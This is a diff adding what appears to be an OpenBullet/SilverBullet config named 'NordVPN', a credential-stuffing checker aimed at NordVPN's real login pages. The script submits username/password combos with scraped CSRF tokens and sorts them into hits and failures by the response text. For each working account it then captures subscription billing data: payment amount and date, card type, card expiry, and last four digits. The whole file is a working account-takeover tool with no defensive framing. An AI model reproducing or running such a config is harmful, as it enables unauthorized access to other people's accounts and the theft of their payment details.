@@ -1,0 +1,172 @@
+[SETTINGS]
+{
+  "Name": "NordVPN",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-08-27T18:18:49.0383263+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Aneek",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Nord",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://my.nordaccount.com/oauth2/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "robots" 
+  KEYCHAIN Retry OR 
+    KEY "robots" 
+
+#AD PARSE "<ADDRESS>" LR "" "" -> VAR "AD" 
+
+#csrf PARSE "<COOKIES(csrf)>" LR "" "" -> VAR "csrf" 
+
+#cfbm PARSE "<COOKIES(__cf_bm)>" LR "" "" -> VAR "cfbm" 
+
+FUNCTION Length "identifier=<USER>&_csrf=<csrf>" -> VAR "leng" 
+
+REQUEST POST "<AD>" 
+  CONTENT "identifier=<USER>&_csrf=<csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Host: nordaccount.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8" 
+  HEADER "Accept-Language: ro-RO,ro;q=0.8,en-US;q=0.6,en-GB;q=0.4,en;q=0.2" 
+  HEADER "Referer: <AD>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://nordaccount.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Priority: u=0, i" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <leng>" 
+
+#PS PARSE "<ADDRESS>" LR "" "" -> VAR "PS" 
+
+FUNCTION Length "password=<PASS>&_csrf=<csrf>" -> VAR "leng2" 
+
+REQUEST POST "<PS>" 
+  CONTENT "password=<PASS>&_csrf=<csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: nordaccount.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8" 
+  HEADER "Accept-Language: ro-RO,ro;q=0.8,en-US;q=0.6,en-GB;q=0.4,en;q=0.2" 
+  HEADER "Referer: <PS>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://nordaccount.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Priority: u=0, i" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <leng>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://my.nordaccount.com/dashboard/" 
+  KEYCHAIN Failure OR 
+    KEY "Account locked for security reasons." 
+    KEY "The password you entered is incorrect. Please try again." 
+
+#csrf PARSE "<SOURCE>" LR "csrfToken: '" "'," -> VAR "csrf3" 
+
+REQUEST GET "https://my.nordaccount.com/api/v1/subscriptions" 
+  
+  HEADER "Host: my.nordaccount.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: ro-RO,ro;q=0.8,en-US;q=0.6,en-GB;q=0.4,en;q=0.2" 
+  HEADER "Referer: https://my.nordaccount.com/dashboard/" 
+  HEADER "x-csrf-token: <csrf3>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Priority: u=4" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#paymentat PARSE "<SOURCE>" LR "next_payment_at\":\"" "T" CreateEmpty=FALSE -> CAP "Next Payment Date:" 
+
+#amount PARSE "<SOURCE>" JSON "amount" CreateEmpty=FALSE -> CAP "Payment Amount:" 
+
+#interval PARSE "<SOURCE>" JSON "frequency_interval_months" CreateEmpty=FALSE -> CAP "Payment Interval:" 
+
+#recuring PARSE "<SOURCE>" JSON "is_recurring" CreateEmpty=FALSE -> CAP "Is Recurring:" 
+
+#payment PARSE "<SOURCE>" LR "ordsec_payments_stripe\",\"" "\":" CreateEmpty=FALSE -> CAP "Payment Method:" 
+
+#type PARSE "<SOURCE>" LR "\":{\"type\":\"" "\"," CreateEmpty=FALSE -> CAP "Card Type:" 
+
+#year PARSE "<SOURCE>" LR "expiration\":{\"year\":" ",\"" -> VAR "year" 
+
+#month PARSE "<SOURCE>" LR ",\"month\":" "}" -> VAR "month" 
+
+FUNCTION Constant "(<year>/<month>" -> CAP "Card Expire Year:" 
+
+#digits PARSE "<SOURCE>" JSON "last_digits" CreateEmpty=FALSE -> CAP "Last 4 Digits:" 
+
